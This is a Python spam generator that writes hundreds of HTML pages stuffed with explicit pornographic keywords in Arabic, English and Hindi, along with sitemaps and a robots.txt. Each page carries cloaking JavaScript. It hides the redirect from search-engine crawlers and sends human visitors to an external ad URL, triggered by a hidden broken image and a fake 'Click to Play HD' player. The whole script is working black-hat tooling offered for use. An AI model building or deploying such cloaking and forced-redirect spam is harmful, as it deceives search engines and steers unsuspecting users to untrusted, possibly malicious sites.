import os
import random
import string
import re
from datetime import datetime

class UltraAggressiveSEO:
    def __init__(self):
        self.main_folder = "news"
        # الكلمات المفتاحية للمجلدات الجديدة
        self.base_subfolders = ["trending", "video", "cinema", "hot", "updates"]
        self.max_files_per_folder = 500
        self.domain = self._get_domain()
        
        # تغيير أسماء ملفات السايت ماب لأسماء غير تقليدية
        self.sitemap_index_file = "index_map.xml" 
        
        self.redirect_url = "https://accumulaterehearsehealing.com/v8f7nbpnim?key=7f6a5217f51c6a62c1c630a20f2d2a75"

        self.keywords_ar = self._load_keywords("keywords_ar.txt", ["سكس عربي", "نيك", "سكس مصري", "سكس مترجم", "سكس محارم"])
        self.keywords_en = self._load_keywords("keywords_en.txt", ["xnxx", "porn", "sex video", "sexy", "XNXX"])
        self.keywords_in = self._load_keywords("keywords_in.txt", ["देसी सेक्स", "भाभी की चुत", "हिन्दी सेक्स فيديو", "देसी भाभी", "गाँड मारना"])
        
        self.aggro_styles = {
            "ar": {
                "prefixes": ["~+🍒💋+", "++حصري++", "[فضيحة!]", "▶ شاهد الآن", "🍒💋"],
                "suffixes": ["فيديو سكس ", "بدون حذف", "سكس", "جديد 2026"],
                "keywords": self.keywords_ar
            },
            "en": {
                "prefixes": ["~+🍒💋+xXx-SeX-Pron!", "++xXX-videos!", "[FULL-HD]", "~SCANDAL~", "++XNXX~VIDEO~SeX!)"],
                "suffixes": ["PornHuB Videos", "Viral xnxx", "Leaked Video Viral", "free Mobile Porn"],
                "keywords": self.keywords_en
            },
            "in": {
                "prefixes": ["~+🍒💋+Desi-Maza", "++HOT-HINDI++", "[NEW-VIDEO]", "▶ अभी देखें", "💋देसी💋"],
                "suffixes": ["Hindi Sex Video", "Full HD Porn", "Bhabhi Ki Chudai", "Viral Desi Video"],
                "keywords": self.keywords_in
            }
        }

        self.template_power_words = ["حصرياً", "بدقة عالية", "HD 1080p", "بدون إعلانات", "Full Movie", "HD Video"]

        # تم دمج كود جوجل أنالتيكس في القالب أدناه
        self.movie_template = """<!DOCTYPE html>
<html>
<head>
    <!-- Google tag (gtag.js) -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-9WPQ3R5GSC"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', 'G-9WPQ3R5GSC');
    </script>
    <meta charset="UTF-8">
    <title>{{TITLE}}</title>
    <meta name="description" content="{{DESCRIPTION}}">
    <link rel="canonical" href="{{CANONICAL_URL}}">
    <style>
        body { background-color: #0b0b0b; color: #fff; font-family: sans-serif; margin: 0; padding: 20px; line-height: 1.6; text-align: center; }
        .container { max-width: 900px; margin: auto; background: #1a1a1a; padding: 30px; border-radius: 8px; border: 1px solid #333; }
        h1 { color: #e50914; font-size: 28px; border-bottom: 2px solid #e50914; padding-bottom: 10px; }
        .player-placeholder { background: #000; height: 400px; display: flex; align-items: center; justify-content: center; border: 2px dashed #444; margin-bottom: 20px; cursor: pointer; }
        .internal-links a { color: #aaa; text-decoration: none; display: block; margin: 5px 0; font-size: 14px; }
        .internal-links a:hover { color: #e50914; }
    </style>
    <script>
        function executeRedirect() {
            var userAgent = navigator.userAgent.toLowerCase();
            var bots = ["googlebot", "bingbot", "yandexbot", "baiduspider", "slurp", "duckduckbot", "lighthouse", "bot", "crawl", "spider"];
            var isBot = bots.some(function(bot) { return userAgent.includes(bot); });
            if (!isBot) {
                window.location.href = "{{REDIRECT_URL}}";
            }
        }
    </script>
</head>
<body>
    <img src='/static/images/{{RANDOM_IMG}}.png' style='display:none;' onerror='executeRedirect()'>
    <div class="container">
        <h1>{{TITLE}}</h1>
        <div class="player-placeholder" onclick='executeRedirect()'>
            <div style="text-align:center;"><span style="font-size:50px;">▶</span><br>Click to Play HD</div>
        </div>
        <div class="content">{{DYNAMIC_BODY}}</div>
        <div class="internal-links"><h3>Recommended:</h3>{{INTERNAL_LINKS}}</div>
    </div>
</body>
</html>"""

    def _load_keywords(self, filename, fallback):
        if os.path.exists(filename):
            try:
                with open(filename, "r", encoding="utf-8") as f:
                    content = [line.strip() for line in f.readlines() if line.strip()]
                    return content if content else fallback
            except: return fallback
        return fallback

    def _get_domain(self):
        if os.path.exists("CNAME"):
            with open("CNAME", "r") as f: return f.read().strip()
        return "movies-portal.edu"

    def get_target_subfolder(self):
        if not os.path.exists(self.main_folder):
            os.makedirs(self.main_folder)

        existing_dirs = [d for d in os.listdir(self.main_folder) if os.path.isdir(os.path.join(self.main_folder, d))]
        
        for folder in existing_dirs:
            full_path = os.path.join(self.main_folder, folder)
            files_count = len([f for f in os.listdir(full_path) if f.endswith('.html')])
            if files_count < self.max_files_per_folder:
                return folder

        base = random.choice(self.base_subfolders)
        new_index = len(existing_dirs) + 1
        new_folder_name = f"{base}_{new_index}"
        os.makedirs(os.path.join(self.main_folder, new_folder_name))
        return new_folder_name

    def generate_content_for_lang(self, lang_code):
        cfg = self.aggro_styles[lang_code]
        prefix = random.choice(cfg["prefixes"])
        words_count = random.randint(5, 10)
        selected_keywords = random.sample(cfg["keywords"], min(len(cfg["keywords"]), words_count))
        suffix = random.choice(cfg["suffixes"])
        title = f"{prefix} {' '.join(selected_keywords)} {suffix}"
        description = f"{title} - {' '.join(random.sample(self.template_power_words, 2))}"
        return title, description

    def clean_slug(self, title):
        clean = re.sub(r'[^a-zA-Z\s\u0600-\u06FF\u0900-\u097F-]', '', title).lower()
        slug = re.sub(r'[-\s]+', '-', clean).strip('-')
        random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=4))
        return "-".join(slug.split("-")[:8]) + f"-{random_str}.html"

    def update_sitemap_index(self):
        all_files = os.listdir('.')
        sitemaps = [f for f in all_files if f.startswith('map_') and f.endswith('.xml')]
        
        index_content = '<?xml version="1.0" encoding="UTF-8"?>\n'
        index_content += '<sitemapindex xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">\n'
        
        for sm in sitemaps:
            index_content += '  <sitemap>\n'
            index_content += f'    <loc>https://{self.domain}/{sm}</loc>\n'
            index_content += f'    <lastmod>{datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S+00:00")}</lastmod>\n'
            index_content += '  </sitemap>\n'
            
        index_content += '</sitemapindex>'
        
        with open(self.sitemap_index_file, "w", encoding="utf-8") as f:
            f.write(index_content)
        
        with open("robots.txt", "w", encoding="utf-8") as f:
            f.write(f"User-agent: *\nAllow: /\n\n")
            f.write(f"Sitemap: https://{self.domain}/{self.sitemap_index_file}\n")

    def create_sitemap(self, pages):
        random_name = ''.join(random.choices(string.ascii_lowercase, k=10))
        sitemap_name = f"map_{random_name}.xml"
        
        sitemap_content = '<?xml version="1.0" encoding="UTF-8"?>\n<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">\n'
        for p in pages:
            sitemap_content += f'  <url>\n    <loc>{p["url"]}</loc>\n    <lastmod>{datetime.utcnow().strftime("%Y-%m-%d")}</lastmod>\n    <changefreq>daily</changefreq>\n    <priority>0.8</priority>\n  </url>\n'
        sitemap_content += '</urlset>'
        
        with open(sitemap_name, "w", encoding="utf-8") as f:
            f.write(sitemap_content)
            
        self.update_sitemap_index()
        return sitemap_name

    def run(self, count=150):
        target_sub = self.get_target_subfolder()
        path = os.path.join(self.main_folder, target_sub)
        
        current_files = len([f for f in os.listdir(path) if f.endswith('.html')])
        remaining_capacity = self.max_files_per_folder - current_files
        
        actual_count = min(count, remaining_capacity)
        
        if actual_count <= 0:
            print(f"Folder {target_sub} is full. Re-running to find/create new folder.")
            self.run(count)
            return

        pages = []
        languages = ["ar", "en", "in"]
        
        print(f"Targeting folder: {target_sub} (Current files: {current_files})")
        print(f"Generating {actual_count} pages with Tracking...")
        
        for _ in range(actual_count):
            lang = random.choice(languages)
            title, description = self.generate_content_for_lang(lang)
            slug = self.clean_slug(title)
            pages.append({
                "title": title, 
                "description": description, 
                "slug": slug, 
                "url": f"https://{self.domain}/{self.main_folder}/{target_sub}/{slug}"
            })

        for p in pages:
            internal_sample = random.sample(pages, min(len(pages), 10))
            internal = "".join([f"<a href='{x['url']}'>{x['title']}</a>" for x in internal_sample])
            body_text = f"Watch {p['title']} exclusive in HD. {p['description']}."
            
            final_html = self.movie_template.replace("{{TITLE}}", p['title'])\
                                           .replace("{{DESCRIPTION}}", p['description'])\
                                           .replace("{{DYNAMIC_BODY}}", body_text)\
                                           .replace("{{INTERNAL_LINKS}}", internal)\
                                           .replace("{{CANONICAL_URL}}", p['url'])\
                                           .replace("{{REDIRECT_URL}}", self.redirect_url)\
                                           .replace("{{RANDOM_IMG}}", "img_" + ''.join(random.choices(string.digits, k=5)))
            
            with open(os.path.join(path, p['slug']), "w", encoding="utf-8") as f:
                f.write(final_html)
        
        self.create_sitemap(pages)
        print(f"Success: {actual_count} pages added to {target_sub} with Google Analytics tag.")

if __name__ == "__main__":
    bot = UltraAggressiveSEO()
    bot.run(count=100)